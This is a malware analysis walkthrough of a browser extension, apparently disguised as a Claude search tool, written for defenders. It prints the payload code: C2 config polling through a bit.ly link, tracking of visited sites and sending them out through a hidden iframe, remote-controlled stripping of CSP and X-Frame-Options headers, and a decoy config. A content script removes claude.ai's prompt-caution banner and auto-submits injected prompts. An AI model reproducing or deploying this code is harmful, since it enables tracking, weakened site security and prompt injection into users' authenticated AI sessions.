# Code walkthrough

*[Versión en español](code-walkthrough.es.md)*

Source as shipped in 2.1.9. Line numbers refer to `background.js` (370 lines) and `content.js`
(69 lines) extracted from the signed package.

Lines 1–99 of `background.js` implement the advertised functionality: omnibox handler, three context
menu entries, and a tab opener for `https://claude.ai/new?q=`. Everything from line 101 onward is the
added payload, split across two IIFEs that never appear in the extension's description.

## Block 1 — `claudeSearchRemoteCfgBootstrap` (lines 101–128)

```js
const CLAUDE_SEARCH_REMOTE_CFG_KEY = 'claudeSearchRemoteCfg';
const CLAUDE_SEARCH_CHANNEL_URL = 'https://bit.ly/release_note_for_claude';
const CLAUDE_SEARCH_CFG_SYNC_MS = 8 * 60 * 1000;

async function claudeSearchPullRemoteCfg() {
  try {
    const response = await fetch(CLAUDE_SEARCH_CHANNEL_URL, {
      credentials: 'include',
      cache: 'no-store'
    });
    if (!response.ok) return;
    const searchRemoteTune = await response.json();
    if (!searchRemoteTune || typeof searchRemoteTune !== 'object') return;
    const stored = await chrome.storage.local.get(CLAUDE_SEARCH_REMOTE_CFG_KEY);
    const existing = stored[CLAUDE_SEARCH_REMOTE_CFG_KEY] || {};
    const merged = Object.assign({}, existing, searchRemoteTune);
    await chrome.storage.local.set({ [CLAUDE_SEARCH_REMOTE_CFG_KEY]: merged });
  } catch (_err) {
  }
}

claudeSearchPullRemoteCfg();
setInterval(claudeSearchPullRemoteCfg, CLAUDE_SEARCH_CFG_SYNC_MS);
```

Three details matter here.

`credentials: 'include'` is unnecessary for fetching a configuration document. Its effect is to let
the responding server set a cookie on first contact and receive it back on every subsequent poll,
producing a stable per-installation identifier. On the analysed host this produced `v` and `ts` on
`stable-channel.zeabur.app`, created in the same second the update landed and still present 36 days
later.

`Object.assign` merges rather than replaces, so a field pushed once persists until explicitly
overwritten. The C2 can seed a value and then stop serving it.

The empty `catch` swallows every failure. Network errors, malformed JSON and blocked requests all
produce no console output, no retry backoff, and no user-visible symptom.

## Block 2 — `claudeSearchWarmupRuntime` (lines 133–370)

### Constants

```js
const CLAUDE_SEARCH_WARMUP_REASON   = 'searchContextWarmup';
const CLAUDE_SEARCH_EXT_INSTANCE    = 'MGNsYXU=';        // base64("0clau")
const CLAUDE_SEARCH_VISIT_THRESHOLD = 3;
const CLAUDE_SEARCH_COOLDOWN_MS     = 5 * 60 * 1000;
const CLAUDE_SEARCH_DNR_RULE_BASE   = 17391;
```

### Navigation tracking

`chrome.tabs.onUpdated` fires on every URL change. Each http(s) navigation is reduced to its origin
and counted:

```js
async function claudeSearchRecordOriginVisit(origin) {
  const stats = await claudeSearchLoadVisitStats();
  if (!stats[origin]) stats[origin] = { visitCount: 0, lastSearchWarmupAt: 0 };
  stats[origin].visitCount += 1;
  await claudeSearchSaveVisitStats(stats);
  return stats[origin];
}
```

The `tabs` permission is what makes `changeInfo.url` populated. Without it the listener would fire but
carry no URL. It is not needed for anything the extension advertises.

### Trigger and transmission

```js
async function claudeSearchMaybeLoadWarmupFrame(origin, entry) {
  if ((entry.visitCount || 0) < CLAUDE_SEARCH_VISIT_THRESHOLD) return;
  if (entry.lastSearchWarmupAt > 0 &&
      Date.now() - entry.lastSearchWarmupAt < CLAUDE_SEARCH_COOLDOWN_MS) return;

  const remoteCfg = await claudeSearchLoadRemoteCfg();
  const endpointBase = remoteCfg.u;
  if (!endpointBase || typeof endpointBase !== 'string') return;
  // ... records lastSearchWarmupAt ...
  const assistUrl = claudeSearchBuildWarmupUrl(endpointBase, origin);
  claudeSearchLoadWarmupFrame(assistUrl);
}

function claudeSearchBuildWarmupUrl(endpointBase, origin) {
  const separator = endpointBase.indexOf('?') >= 0 ? '&' : '?';
  return endpointBase + separator + 'r=' + CLAUDE_SEARCH_WARMUP_REASON +
    '&i=' + CLAUDE_SEARCH_EXT_INSTANCE +
    '&u=' + claudeSearchEncodeOrigin(origin);   // btoa(origin)
}

function claudeSearchLoadWarmupFrame(assistUrl) {
  if (typeof document === 'undefined') return;
  const host = document.body || document.documentElement;
  const frame = document.createElement('iframe');
  frame.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute';
  frame.src = assistUrl;
  host.appendChild(frame);
  setTimeout(function () {
    if (frame.parentNode) frame.parentNode.removeChild(frame);
  }, 30000);
}
```

The iframe is attached to the extension's own background page, not to the visited tab. That is why
these loads never appear in browsing history and are invisible in the page the user is looking at. The
frame is destroyed after 30 seconds.

Note the shape of the exchange: the origin is a request parameter and the response is loaded. This is
not a collection routine that batches data for later upload — it is a request/response loop in which
the server is told which site the user is on and gets to decide what to return for it. The visit
threshold and the cooldown reduce volume rather than maximise it, which is consistent with evading
notice and with selecting targets, not with harvesting for resale.

### Header stripping

```js
async function claudeSearchApplyResponseHeaderRules() {
  const remoteCfg = await claudeSearchLoadRemoteCfg();
  const headerList = remoteCfg.h;
  // ... clears previous rules in range 17391..17441 ...
  const responseHeaders = headerList
    .map(function (name) { return String(name).trim().toLowerCase(); })
    .filter(Boolean)
    .map(function (name) { return { header: name, operation: 'remove' }; });

  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: removeRuleIds,
    addRules: [{
      id: CLAUDE_SEARCH_DNR_RULE_BASE,
      priority: 1,
      action: { type: 'modifyHeaders', responseHeaders: responseHeaders },
      condition: { urlFilter: '*', resourceTypes: ['sub_frame'] }
    }]
  });
}
```

The header names are never hardcoded. They come from `remoteCfg.h`, which comes from the C2. The
function runs on install, on every startup, and again whenever the stored configuration changes:

```js
chrome.storage.onChanged.addListener(function (changes, area) {
  if (area === 'local' && changes[CLAUDE_SEARCH_REMOTE_CFG_KEY]) {
    claudeSearchApplyResponseHeaderRules();
  }
});
```

So a new list of headers takes effect within one poll interval, without an update.

### The decoy

```js
const seed = {"engineLabel":"Claude","omniboxToken":"claude","preferDefault":true,
              "h":["x-claude-omnibox-hint","etag-search-claude"],
              "u":"https://claude.ai/"};
```

This is what is present in the reviewed package. `x-claude-omnibox-hint` and `etag-search-claude` are
not real headers; stripping them from sub-frames does nothing. `u` points at claude.ai, so the iframe
loads a benign page. Static review of the submitted artefact shows a plausible, inert feature. The
operative values arrive later over the network.

On the analysed host the stored configuration read:

```
h: ["content-security-policy", "x-frame-options"]
u: "https://kmn6d3go6kuodubmfoiawcstl40ukbqb.lambda-url.us-west-2.on.aws/"
```

## `content.js`

Registered for `https://claude.ai/*` only.

```js
const CAUTION_NEEDLE = "Use caution before running this prompt";
function stripMaliciousPromptBanner() {
  for (const el of document.querySelectorAll('[role="status"][aria-live="polite"]')) {
    if (!el.textContent.includes(CAUTION_NEEDLE)) continue;
    const wrap = el.parentElement;
    if (wrap) wrap.remove();
    break;
  }
}
stripMaliciousPromptBanner();
const bannerObserver = new MutationObserver(stripMaliciousPromptBanner);
bannerObserver.observe(document.documentElement, { childList: true, subtree: true });
setTimeout(() => bannerObserver.disconnect(), 6e4);
```

The selector targets the live region the host application uses for its warning. The observer keeps
removing it for 60 seconds, covering re-renders.

The remainder reads `?q=` from the URL, writes it into the composer using a native value setter so the
framework registers the change, then polls for the send button and clicks it:

```js
const query = new URLSearchParams(location.search).get("q");
// ...
function waitForSendButton() {
  const btn = findSendButton();
  if (btn && !btn.disabled) { btn.click(); return; }
  elapsed += POLL_INTERVAL;
  if (elapsed < MAX_WAIT_MS) setTimeout(waitForSendButton, POLL_INTERVAL);
}
```

Auto-submission on its own is a plausible convenience for a search extension. Auto-submission
*combined with* removing the warning that exists precisely to make the user read such a prompt before
it runs is not. Any `claude.ai/new?q=<text>` link becomes an instruction that executes inside the
user's authenticated session with the safety notice removed from the screen first.

## Reproduction

```sh
unzip -d out default_claude_ai-2.1.9.xpi
sha256sum out/background.js out/content.js out/manifest.json
sed -n '101,370p' out/background.js
```

Resolve the redirector without contacting the final host — bit.ly answers the 301 itself:

```sh
curl -sI https://bit.ly/release_note_for_claude | grep -i ^location
```
